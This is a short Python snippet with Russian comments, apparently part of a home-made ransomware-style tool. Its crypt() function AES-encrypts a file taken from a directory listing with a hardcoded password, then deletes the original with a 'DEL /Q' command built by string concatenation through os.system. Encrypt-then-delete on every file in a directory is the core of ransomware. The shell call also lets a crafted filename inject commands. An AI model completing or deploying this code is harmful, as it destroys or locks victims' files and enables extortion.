import os
import pyAesCrypt # Основная штуковина для шифрования, жутко простой модуль

def crypt(): #Функция шифрации файлов

    global list
    global counter

    password = '8949821812876327517298129983712381538913871237126378'
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(list[counter]), str(list[counter])+'.aes', password, bufferSize) #Лист здесь выбивает название файла, там я делал функцию перебора файлов в директории
    print('[Crypted]'+str(list[counter])+'.aes')
    os.system('DEL /Q ' + str(list[counter])) #Тут может быть ошибка, посокльку я не гребу, какие там команды в cmd на винде. Удаляет оригинальный файл